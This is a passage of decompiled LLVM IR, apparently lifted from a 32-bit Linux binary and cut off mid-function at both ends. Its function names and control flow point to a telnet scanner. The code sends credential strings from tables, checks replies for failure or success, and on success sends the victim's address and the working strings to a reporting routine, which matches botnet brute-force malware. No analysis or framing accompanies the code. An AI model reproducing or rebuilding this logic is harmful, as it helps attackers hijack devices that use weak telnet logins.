  %v3_80514f1 = inttoptr i32 %v2_80514f1 to i32*
  store i32 %v3_80514eb, i32* %v3_80514f1, align 4
  %v1_80514f2 = call i32 @contains_fail(i32 %stack_var_-624.251)
  %v0_80514f7 = load i32, i32* @esp, align 4
  %v1_80514fa = icmp eq i32 %v1_80514f2, 0
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v1_805153c = add i32 %v0_80514f7, 4
  %v2_805153c = inttoptr i32 %v1_805153c to i32*
  br i1 %v1_80514fa, label %dec_label_pc_8051525, label %dec_label_pc_80514fe

dec_label_pc_80514fe:                             ; preds = %dec_label_pc_80514b1
  store i32 0, i32* %v2_805153c, align 4
  %v0_8051517 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051517 = inttoptr i32 %v0_80514f7 to i32*
  store i32 %v0_8051517, i32* %v3_8051517, align 4
  %v3_8051518 = call i32 @advance_telstate(i32* %v1_80514b9, i32 %v2_8050bbb)
  store i32 %v3_8051518, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051525:                             ; preds = %dec_label_pc_80514b1
  store i32 5, i32* %v2_805153c, align 4
  %v0_805153e = load i32, i32* %eax.global-to-local, align 4
  %v3_805153e = inttoptr i32 %v0_80514f7 to i32*
  store i32 %v0_805153e, i32* %v3_805153e, align 4
  %v3_805153f = call i32 @advance_telstate(i32* %v1_80514b9, i32 %v2_8050bbb)
  store i32 %v3_805153f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_805154c:                             ; preds = %dec_label_pc_8051462
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v5_805155d = load i32, i32* %v4_8050c76, align 4
  store i32 %v5_805155d, i32* %eax.global-to-local, align 4
  %v1_8051561 = add i32 %v5_805155d, 7
  store i32 %v1_8051561, i32* @ebx, align 4
  %v1_8051567 = add i32 %v0_80514a6, 16
  %v2_8051567 = inttoptr i32 %v1_8051567 to i32*
  store i32 0, i32* %v2_8051567, align 4
  %v1_8051569 = inttoptr i32 %stack_var_-624.251 to i32*
  %v2_8051569 = call i32 @__GI_time(i32* %v1_8051569)
  store i32 %v2_8051569, i32* %eax.global-to-local, align 4
  %v0_8051571 = load i32, i32* @ebx, align 4
  %v7_8051571 = icmp ult i32 %v0_8051571, %v2_8051569
  %v1_8051573 = icmp eq i1 %v7_8051571, false
  br i1 %v1_8051573, label %dec_label_pc_8051d87, label %dec_label_pc_8051579

dec_label_pc_8051579:                             ; preds = %dec_label_pc_805154c
  %v0_805156e = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_8051590 = inttoptr i32 %v0_805156e to i32*
  store i32 %v2_8050cb3, i32* %v3_8051590, align 4
  %v1_8051591 = call i32 @reset_telstate(i32 %stack_var_-624.251)
  store i32 %v1_8051591, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_805159e:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_80515b1 = add i32 %v2_8050cb3, 11
  store i32 %v1_80515b1, i32* %eax.global-to-local, align 4
  %v1_80515b4 = inttoptr i32 %v1_80515b1 to i8*
  %v2_80515b4 = load i8, i8* %v1_80515b4, align 1
  %v3_80515b4 = zext i8 %v2_80515b4 to i32
  store i32 %v3_80515b4, i32* %eax.global-to-local, align 4
  %v1_80515bb = mul nuw nsw i32 %v3_80515b4, 4
  %v2_80515bb = add nuw nsw i32 %v1_80515bb, 134673728
  %v3_80515bb = inttoptr i32 %v2_80515bb to i32*
  %v4_80515bb = load i32, i32* %v3_80515bb, align 4
  %v1_80515cd = and i32 %v4_80515bb, -256
  store i32 %v1_80515cd, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80515d0 = inttoptr i32 %v4_80515bb to i8*
  store i32 %v4_80515bb, i32* @edi, align 4
  %v3_80515d6 = call i32 @_strlen(i8* %v4_80515d0)
  store i32 %v3_80515d6, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_80515b1, i32* %eax.global-to-local, align 4
  %v2_80515f5 = load i8, i8* %v1_80515b4, align 1
  %v3_80515f5 = zext i8 %v2_80515f5 to i32
  store i32 %v3_80515f5, i32* %eax.global-to-local, align 4
  %v1_80515fc = mul nuw nsw i32 %v3_80515f5, 4
  %v2_80515fc = add nuw nsw i32 %v1_80515fc, 134673728
  %v3_80515fc = inttoptr i32 %v2_80515fc to i32*
  %v4_80515fc = load i32, i32* %v3_80515fc, align 4
  store i32 %v4_80515fc, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8051614 = inttoptr i32 %v2_8050cb3 to i32*
  %v4_8051614 = load i32, i32* %v3_8051614, align 4
  store i32 %v4_8051614, i32* %eax.global-to-local, align 4
  %v0_8051617 = load i32, i32* @esp, align 4
  %v1_8051617 = add i32 %v0_8051617, -4
  %v2_8051617 = inttoptr i32 %v1_8051617 to i32*
  store i32 16384, i32* %v2_8051617, align 4
  %v0_805161c = load i32, i32* @ebx, align 4
  %v2_805161c = add i32 %v0_8051617, -8
  %v3_805161c = inttoptr i32 %v2_805161c to i32*
  store i32 %v0_805161c, i32* %v3_805161c, align 4
  %v0_805161d = load i32, i32* @esi, align 4
  %v2_805161d = add i32 %v0_8051617, -12
  %v3_805161d = inttoptr i32 %v2_805161d to i32*
  store i32 %v0_805161d, i32* %v3_805161d, align 4
  %v0_805161e = load i32, i32* %eax.global-to-local, align 4
  %v2_805161e = add i32 %v0_8051617, -16
  %v3_805161e = inttoptr i32 %v2_805161e to i32*
  store i32 %v0_805161e, i32* %v3_805161e, align 4
  %v4_805161f = call i32 @send(i32 %v4_80515bb, i32 %stack_var_-624.251, i32 %v2_8050bbb, i32 %v3_8050cb8)
  store i32 %v4_805161f, i32* %eax.global-to-local, align 4
  %v0_8051624 = load i32, i32* @esp, align 4
  %v2_8051627 = icmp slt i32 %v4_805161f, 0
  %v1_8051629 = icmp eq i1 %v2_8051627, false
  br i1 %v1_8051629, label %dec_label_pc_8051650, label %dec_label_pc_805162b

dec_label_pc_805162b:                             ; preds = %dec_label_pc_805159e
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_8051642 = inttoptr i32 %v0_8051624 to i32*
  store i32 %v2_8050cb3, i32* %v3_8051642, align 4
  %v1_8051643 = call i32 @reset_telstate(i32 %v4_80515bb)
  store i32 %v1_8051643, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051650:                             ; preds = %dec_label_pc_805159e
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8051661 = load i32, i32* %v3_8051614, align 4
  store i32 %v4_8051661, i32* %eax.global-to-local, align 4
  %v1_8051664 = add i32 %v0_8051624, 12
  %v2_8051664 = inttoptr i32 %v1_8051664 to i32*
  store i32 16384, i32* %v2_8051664, align 4
  %v1_8051669 = add i32 %v0_8051624, 8
  %v2_8051669 = inttoptr i32 %v1_8051669 to i32*
  store i32 2, i32* %v2_8051669, align 4
  %v1_805166b = add i32 %v0_8051624, 4
  %v2_805166b = inttoptr i32 %v1_805166b to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_806a228.281 to i32), i32* %v2_805166b, align 4
  %v0_8051670 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051670 = inttoptr i32 %v0_8051624 to i32*
  store i32 %v0_8051670, i32* %v3_8051670, align 4
  %v4_8051671 = call i32 @send(i32 %v4_80515bb, i32 %stack_var_-624.251, i32 %v2_8050bbb, i32 %v3_8050cb8)
  %v0_8051676 = load i32, i32* @esp, align 4
  %v2_8051679 = icmp slt i32 %v4_8051671, 0
  %v1_805167b = icmp eq i1 %v2_8051679, false
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  br i1 %v1_805167b, label %dec_label_pc_80516a2, label %dec_label_pc_805167d

dec_label_pc_805167d:                             ; preds = %dec_label_pc_8051650
  %v3_8051694 = inttoptr i32 %v0_8051676 to i32*
  store i32 %v2_8050cb3, i32* %v3_8051694, align 4
  %v1_8051695 = call i32 @reset_telstate(i32 %v4_80515bb)
  store i32 %v1_8051695, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80516a2:                             ; preds = %dec_label_pc_8051650
  %v1_80516b9 = add i32 %v0_8051676, 4
  %v2_80516b9 = inttoptr i32 %v1_80516b9 to i32*
  store i32 6, i32* %v2_80516b9, align 4
  %v0_80516bb = load i32, i32* %eax.global-to-local, align 4
  %v3_80516bb = inttoptr i32 %v0_8051676 to i32*
  store i32 %v0_80516bb, i32* %v3_80516bb, align 4
  %v2_80516bc = inttoptr i32 %v4_80515bb to i32*
  %v3_80516bc = call i32 @advance_telstate(i32* %v2_80516bc, i32 %stack_var_-624.251)
  store i32 %v3_80516bc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80516c9:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_80516dc = add i32 %v2_8050cb3, 16
  store i32 %v1_80516dc, i32* %eax.global-to-local, align 4
  %v1_80516df = add i32 %v2_8050cb3, 19
  %v2_80516df = inttoptr i32 %v1_80516df to i32*
  %v3_80516df = load i32, i32* %v2_80516df, align 4
  store i32 %v3_80516df, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_80516f3 = inttoptr i32 %v2_8050cb3 to i32*
  %v4_80516f3 = load i32, i32* %v3_80516f3, align 4
  store i32 %v4_80516f3, i32* %eax.global-to-local, align 4
  %v0_80516f6 = load i32, i32* @esp, align 4
  %v1_80516f9 = add i32 %v0_80516f6, -16
  %v2_80516f9 = inttoptr i32 %v1_80516f9 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_806f6e0.282 to i32), i32* %v2_80516f9, align 4
  %v1_80516fe = add i32 %v0_80516f6, -20
  %v2_80516fe = inttoptr i32 %v1_80516fe to i32*
  store i32 1024, i32* %v2_80516fe, align 4
  %v0_8051703 = load i32, i32* @ebx, align 4
  %v2_8051703 = add i32 %v0_80516f6, -24
  %v3_8051703 = inttoptr i32 %v2_8051703 to i32*
  store i32 %v0_8051703, i32* %v3_8051703, align 4
  %v5_8051704 = add i32 %v0_80516f6, -28
  %v6_8051704 = inttoptr i32 %v5_8051704 to i32*
  store i32 %arg1, i32* %v6_8051704, align 4
  %v0_8051707 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051707 = add i32 %v0_80516f6, -32
  %v3_8051707 = inttoptr i32 %v2_8051707 to i32*
  store i32 %v0_8051707, i32* %v3_8051707, align 4
  %v1_8051708 = call i32 @read_until_response(i32 %v3_8050cb8)
  store i32 %v1_8051708, i32* %eax.global-to-local, align 4
  %v0_805170d = load i32, i32* @esp, align 4
  %v1_8051710 = icmp eq i32 %v1_8051708, 0
  br i1 %v1_8051710, label %dec_label_pc_80518a8, label %dec_label_pc_8051718

dec_label_pc_8051718:                             ; preds = %dec_label_pc_80516c9
  store i32 %storemerge53, i32* @ebx, align 4
  %v1_805171e = add i32 %v0_805170d, 16
  %v2_805171e = inttoptr i32 %v1_805171e to i32*
  store i32 0, i32* %v2_805171e, align 4
  %v1_8051720 = inttoptr i32 %stack_var_-628.250 to i32*
  %v2_8051720 = call i32 @__GI_time(i32* %v1_8051720)
  %v0_805172d = load i32, i32* @ebx, align 4
  %v2_8051736 = mul i32 %v0_805172d, 23
  %v4_8051738 = add i32 %v2_8050c76, %v2_8051736
  %v5_8051738 = inttoptr i32 %v4_8051738 to i32*
  store i32 %v2_8051720, i32* %v5_8051738, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v1_80516dc, i32* %eax.global-to-local, align 4
  %v3_8051752 = load i32, i32* %v2_80516df, align 4
  store i32 %v3_8051752, i32* %eax.global-to-local, align 4
  %v0_8051755 = load i32, i32* @esp, align 4
  %v2_8051758 = add i32 %v0_8051755, -16
  %v3_8051758 = inttoptr i32 %v2_8051758 to i32*
  store i32 %v3_8051752, i32* %v3_8051758, align 4
  %v1_8051759 = call i32 @contains_fail(i32 %stack_var_-628.250)
  store i32 %v1_8051759, i32* %eax.global-to-local, align 4
  %v0_805175e = load i32, i32* @esp, align 4
  %v1_8051761 = icmp eq i32 %v1_8051759, 0
  br i1 %v1_8051761, label %dec_label_pc_805178c, label %dec_label_pc_8051765

dec_label_pc_8051765:                             ; preds = %dec_label_pc_8051718
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v1_805177c = add i32 %v0_805175e, 4
  %v2_805177c = inttoptr i32 %v1_805177c to i32*
  store i32 0, i32* %v2_805177c, align 4
  %v0_805177e = load i32, i32* %eax.global-to-local, align 4
  %v3_805177e = inttoptr i32 %v0_805175e to i32*
  store i32 %v0_805177e, i32* %v3_805177e, align 4
  %v3_805177f = call i32 @advance_telstate(i32* %v1_8051720, i32 %stack_var_-624.251)
  store i32 %v3_805177f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_805178c:                             ; preds = %dec_label_pc_8051718
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v1_80516dc, i32* %eax.global-to-local, align 4
  %v3_80517a2 = load i32, i32* %v2_80516df, align 4
  store i32 %v3_80517a2, i32* %eax.global-to-local, align 4
  %v3_80517a8 = inttoptr i32 %v0_805175e to i32*
  store i32 %v3_80517a2, i32* %v3_80517a8, align 4
  %v1_80517a9 = call i32 @contains_success(i32 %stack_var_-628.250)
  store i32 %v1_80517a9, i32* %eax.global-to-local, align 4
  %v0_80517ae = load i32, i32* @esp, align 4
  %v1_80517b1 = icmp eq i32 %v1_80517a9, 0
  br i1 %v1_80517b1, label %dec_label_pc_8051883, label %dec_label_pc_80517b9

dec_label_pc_80517b9:                             ; preds = %dec_label_pc_805178c
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_80517cc = add i32 %v2_8050cb3, 9
  store i32 %v1_80517cc, i32* %eax.global-to-local, align 4
  %v1_80517cf = inttoptr i32 %v1_80517cc to i8*
  %v2_80517cf = load i8, i8* %v1_80517cf, align 1
  %v3_80517cf = zext i8 %v2_80517cf to i32
  %v5_80517cf = and i32 %v1_80517cc, -256
  %v6_80517cf = or i32 %v3_80517cf, %v5_80517cf
  store i32 %v6_80517cf, i32* %eax.global-to-local, align 4
  %v10_80517d1 = icmp eq i8 %v2_80517cf, 2
  %v1_80517d3 = icmp eq i1 %v10_80517d1, false
  br i1 %v1_80517d3, label %dec_label_pc_8051d87, label %dec_label_pc_80517d9

dec_label_pc_80517d9:                             ; preds = %dec_label_pc_80517b9
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_80517ec = add i32 %v2_8050cb3, 11
  store i32 %v1_80517ec, i32* %eax.global-to-local, align 4
  %v1_80517ef = inttoptr i32 %v1_80517ec to i8*
  %v2_80517ef = load i8, i8* %v1_80517ef, align 1
  %v3_80517ef = zext i8 %v2_80517ef to i32
  store i32 %v3_80517ef, i32* %eax.global-to-local, align 4
  %v1_80517f6 = mul nuw nsw i32 %v3_80517ef, 4
  %v2_80517f6 = add nuw nsw i32 %v1_80517f6, 134673728
  %v3_80517f6 = inttoptr i32 %v2_80517f6 to i32*
  %v4_80517f6 = load i32, i32* %v3_80517f6, align 4
  store i32 %v4_80517f6, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051810 = add i32 %v2_8050cb3, 10
  store i32 %v1_8051810, i32* %eax.global-to-local, align 4
  %v1_8051813 = inttoptr i32 %v1_8051810 to i8*
  %v2_8051813 = load i8, i8* %v1_8051813, align 1
  %v3_8051813 = zext i8 %v2_8051813 to i32
  store i32 %v3_8051813, i32* %eax.global-to-local, align 4
  %v1_805181a = mul nuw nsw i32 %v3_8051813, 4
  %v2_805181a = add nuw nsw i32 %v1_805181a, 134673440
  %v3_805181a = inttoptr i32 %v2_805181a to i32*
  %v4_805181a = load i32, i32* %v3_805181a, align 4
  store i32 %v4_805181a, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_8051838 = inttoptr i32 %v0_80517ae to i32*
  store i32 %v2_8050cb3, i32* %v3_8051838, align 4
  %v0_8051839 = call i32 @get_telstate_host()
  store i32 %v0_8051839, i32* %eax.global-to-local, align 4
  %v0_805183e = load i32, i32* @esp, align 4
  %v0_8051844 = load i32, i32* @ebx, align 4
  %v2_8051844 = add i32 %v0_805183e, 4
  %v3_8051844 = inttoptr i32 %v2_8051844 to i32*
  store i32 %v0_8051844, i32* %v3_8051844, align 4
  %v0_8051845 = load i32, i32* @esi, align 4
  %v3_8051845 = inttoptr i32 %v0_805183e to i32*
  store i32 %v0_8051845, i32* %v3_8051845, align 4
  %v2_8051846 = add i32 %v0_805183e, -4
  %v3_8051846 = inttoptr i32 %v2_8051846 to i32*
  store i32 %v0_8051839, i32* %v3_8051846, align 4
  %v1_8051847 = add i32 %v0_805183e, -8
  %v2_8051847 = inttoptr i32 %v1_8051847 to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_806a22b.283 to i32), i32* %v2_8051847, align 4
  %v1_805184c = add i32 %v0_805183e, -12
  %v2_805184c = inttoptr i32 %v1_805184c to i32*
  store i32 ptrtoint ([54 x i8]* @global_var_806a234.284 to i32), i32* %v2_805184c, align 4
  %v5_8051851 = add i32 %v0_805183e, -16
  %v6_8051851 = inttoptr i32 %v5_8051851 to i32*
  store i32 %arg3, i32* %v6_8051851, align 4
  %v2_8051854 = call i32 @Send(i32 %stack_var_-628.250, i32 %stack_var_-624.251)
  %v0_8051859 = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v1_8051873 = add i32 %v0_8051859, 20
  %v2_8051873 = inttoptr i32 %v1_8051873 to i32*
  store i32 7, i32* %v2_8051873, align 4
  %v0_8051875 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051875 = add i32 %v0_8051859, 16
  %v3_8051875 = inttoptr i32 %v2_8051875 to i32*
  store i32 %v0_8051875, i32* %v3_8051875, align 4
  %v3_8051876 = call i32 @advance_telstate(i32* %v1_8051720, i32 %stack_var_-624.251)
  store i32 %v3_8051876, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051883:                             ; preds = %dec_label_pc_805178c
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_805189a = inttoptr i32 %v0_80517ae to i32*
  store i32 %v2_8050cb3, i32* %v3_805189a, align 4
  %v1_805189b = call i32 @reset_telstate(i32 %stack_var_-628.250)
  store i32 %v1_805189b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80518a8:                             ; preds = %dec_label_pc_80516c9
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v5_80518b9 = load i32, i32* %v4_8050c76, align 4
  store i32 %v5_80518b9, i32* %eax.global-to-local, align 4
  %v1_80518bd = add i32 %v5_80518b9, 10
  store i32 %v1_80518bd, i32* @ebx, align 4
  %v1_80518c3 = add i32 %v0_805170d, 16
  %v2_80518c3 = inttoptr i32 %v1_80518c3 to i32*
  store i32 0, i32* %v2_80518c3, align 4
  %v1_80518c5 = inttoptr i32 %stack_var_-628.250 to i32*
  %v2_80518c5 = call i32 @__GI_time(i32* %v1_80518c5)
  store i32 %v2_80518c5, i32* %eax.global-to-local, align 4
  %v0_80518cd = load i32, i32* @ebx, align 4
  %v7_80518cd = icmp ult i32 %v0_80518cd, %v2_80518c5
  %v1_80518cf = icmp eq i1 %v7_80518cd, false
  br i1 %v1_80518cf, label %dec_label_pc_8051d87, label %dec_label_pc_80518d5

dec_label_pc_80518d5:                             ; preds = %dec_label_pc_80518a8
  %v0_80518ca = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v3_80518ec = inttoptr i32 %v0_80518ca to i32*
  store i32 %v2_8050cb3, i32* %v3_80518ec, align 4
  %v1_80518ed = call i32 @reset_telstate(i32 %stack_var_-628.250)
  store i32 %v1_80518ed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_80518fa:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* @ebx, align 4
  %v0_80518fd = load i32, i32* @esp, align 4
  %v1_8051900 = add i32 %v0_80518fd, -16
  %v2_8051900 = inttoptr i32 %v1_8051900 to i32*
  store i32 0, i32* %v2_8051900, align 4
  %v1_8051902 = inttoptr i32 %v3_8050cb8 to i32*
  %v2_8051902 = call i32 @__GI_time(i32* %v1_8051902)
  store i32 %v2_8051902, i32* %edx.global-to-local, align 4
  %v0_805190f = load i32, i32* @ebx, align 4
  %v2_8051918 = mul i32 %v0_805190f, 23
  %v4_805191a = add i32 %v2_8050c76, %v2_8051918
  %v5_805191a = inttoptr i32 %v4_805191a to i32*
  store i32 %v2_8051902, i32* %v5_805191a, align 4
  %v0_805191e = load i32, i32* bitcast ([10 x i8]** @global_var_806f078.286 to i32*), align 8
  %v5_8051928 = inttoptr i32 %v0_805191e to i8*
  %v1_805192e = and i32 %v0_805191e, -256
  store i32 %v1_805192e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_805191e, i32* @edi, align 4
  %v3_8051937 = call i32 @_strlen(i8* %v5_8051928)
  store i32 %v3_8051937, i32* @ebx, align 4
  %v0_8051940 = load i32, i32* bitcast ([10 x i8]** @global_var_806f078.286 to i32*), align 8
  store i32 %v0_8051940, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8051957 = inttoptr i32 %v2_8050cb3 to i32*
  %v4_8051957 = load i32, i32* %v3_8051957, align 4
  store i32 %v4_8051957, i32* %eax.global-to-local, align 4
  %v0_805195a = load i32, i32* @esp, align 4
  %v1_805195a = add i32 %v0_805195a, -4
  %v2_805195a = inttoptr i32 %v1_805195a to i32*
  store i32 16384, i32* %v2_805195a, align 4
  %v0_805195f = load i32, i32* @ebx, align 4
  %v2_805195f = add i32 %v0_805195a, -8
  %v3_805195f = inttoptr i32 %v2_805195f to i32*
  store i32 %v0_805195f, i32* %v3_805195f, align 4
  %v0_8051960 = load i32, i32* @esi, align 4
  %v2_8051960 = add i32 %v0_805195a, -12
  %v3_8051960 = inttoptr i32 %v2_8051960 to i32*
  store i32 %v0_8051960, i32* %v3_8051960, align 4
  %v0_8051961 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051961 = add i32 %v0_805195a, -16
  %v3_8051961 = inttoptr i32 %v2_8051961 to i32*
  store i32 %v0_8051961, i32* %v3_8051961, align 4
  %v5_8051962 = call i32 @send(i32 %v0_805191e, i32 %stack_var_-628.250, i32 %stack_var_-624.251, i32 %v2_8050bbb)
  store i32 %v5_8051962, i32* %eax.global-to-local, align 4
  %v2_805196a = icmp slt i32 %v5_8051962, 0
  %v1_805196c = icmp eq i1 %v2_805196a, false
  br i1 %v1_805196c, label %dec_label_pc_8051a1b, label %dec_label_pc_8051972

dec_label_pc_8051972:                             ; preds = %dec_label_pc_80518fa
  %v0_8051967 = load i32, i32* @esp, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8051985 = add i32 %v2_8050cb3, 11
  store i32 %v1_8051985, i32* %eax.global-to-local, align 4
  %v1_8051988 = inttoptr i32 %v1_8051985 to i8*
  %v2_8051988 = load i8, i8* %v1_8051988, align 1
  %v3_8051988 = zext i8 %v2_8051988 to i32
  store i32 %v3_8051988, i32* %eax.global-to-local, align 4
  %v1_805198f = mul nuw nsw i32 %v3_8051988, 4
  %v2_805198f = add nuw nsw i32 %v1_805198f, 134673728
  %v3_805198f = inttoptr i32 %v2_805198f to i32*
  %v4_805198f = load i32, i32* %v3_805198f, align 4
  store i32 %v4_805198f, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_80519a9 = add i32 %v2_8050cb3, 10
  store i32 %v1_80519a9, i32* %eax.global-to-local, align 4
  %v1_80519ac = inttoptr i32 %v1_80519a9 to i8*
  %v2_80519ac = load i8, i8* %v1_80519ac, align 1
  %v3_80519ac = zext i8 %v2_80519ac to i32
  store i32 %v3_80519ac, i32* %eax.global-to-local, align 4
  %v1_80519b3 = mul nuw nsw i32 %v3_80519ac, 4
  %v2_80519b3 = add nuw nsw i32 %v1_80519b3, 134673440
  %v3_80519b3 = inttoptr i32 %v2_80519b3 to i32*
  %v4_80519b3 = load i32, i32* %v3_80519b3, align 4
  store i32 %v4_80519b3, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_80519cb = add i32 %v2_8050cb3, 4
  store i32 %v1_80519cb, i32* %eax.global-to-local, align 4
  %v1_80519d1 = inttoptr i32 %v1_80519cb to i32*
  %v2_80519d1 = load i32, i32* %v1_80519d1, align 4
  %v5_80519d1 = inttoptr i32 %v0_8051967 to i32*
  store i32 %v2_80519d1, i32* %v5_80519d1, align 4
  %v2_80519d3 = call i32 @__GI_inet_ntoa(i32 %v0_805191e)
  store i32 %v2_80519d3, i32* %eax.global-to-local, align 4
  %v0_80519d8 = load i32, i32* @esp, align 4
  %v0_80519de = load i32, i32* @ebx, align 4
  %v2_80519de = add i32 %v0_80519d8, 4
  %v3_80519de = inttoptr i32 %v2_80519de to i32*
  store i32 %v0_80519de, i32* %v3_80519de, align 4
  %v0_80519df = load i32, i32* @esi, align 4
  %v3_80519df = inttoptr i32 %v0_80519d8 to i32*
  store i32 %v0_80519df, i32* %v3_80519df, align 4
  %v2_80519e0 = add i32 %v0_80519d8, -4
  %v3_80519e0 = inttoptr i32 %v2_80519e0 to i32*
  store i32 %v2_80519d3, i32* %v3_80519e0, align 4
  %v1_80519e1 = add i32 %v0_80519d8, -8
  %v2_80519e1 = inttoptr i32 %v1_80519e1 to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_806a22b.283 to i32), i32* %v2_80519e1, align 4
  %v1_80519e6 = add i32 %v0_80519d8, -12
  %v2_80519e6 = inttoptr i32 %v1_80519e6 to i32*
  store i32 ptrtoint ([69 x i8]* @global_var_806a26c.287 to i32), i32* %v2_80519e6, align 4
  %v5_80519eb = add i32 %v0_80519d8, -16
  %v6_80519eb = inttoptr i32 %v5_80519eb to i32*
  store i32 %arg3, i32* %v6_80519eb, align 4
  %v3_80519ee = call i32 @Send(i32 %v0_805191e, i32 %stack_var_-628.250)
  %v0_80519f3 = load i32, i32* @esp, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %storemerge53, i32* @edx, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v2_8051a0d = add i32 %v0_80519f3, 16
  %v3_8051a0d = inttoptr i32 %v2_8051a0d to i32*
  store i32 %v2_8050cb3, i32* %v3_8051a0d, align 4
  %v2_8051a0e = call i32 @reset_telstate(i32 %v0_805191e)
  store i32 %v2_8051a0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d87

dec_label_pc_8051a1b:                             ; preds = %dec_label_pc_80518fa
  %v0_8051a1b = load i32, i32* bitcast ([129 x i8]** @global_var_806f074.289 to i32*), align 4
  %v5_8051a25 = inttoptr i32 %v0_8051a1b to i8*
  store i8* %v5_8051a25, i8** %stack_var_-636, align 4
  %v1_8051a2b = and i32 %v0_8051a1b, -256
  store i32 %v1_8051a2b, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_8051a1b, i32* @edi, align 4
  %v3_8051a34 = call i32 @_strlen(i8* %v5_8051a25)
  store i32 %v3_8051a34, i32* @ebx, align 4
  %v0_8051a3d = load i32, i32* bitcast ([129 x i8]** @global_var_806f074.289 to i32*), align 4
  store i32 %v0_8051a3d, i32* @esi, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8051a54 = load i32, i32* %v3_8051957, align 4
  store i32 %v4_8051a54, i32* %eax.global-to-local, align 4
  %v0_8051a57 = load i32, i32* @esp, align 4
  %v1_8051a57 = add i32 %v0_8051a57, -4
  %v2_8051a57 = inttoptr i32 %v1_8051a57 to i32*
  store i32 16384, i32* %v2_8051a57, align 4
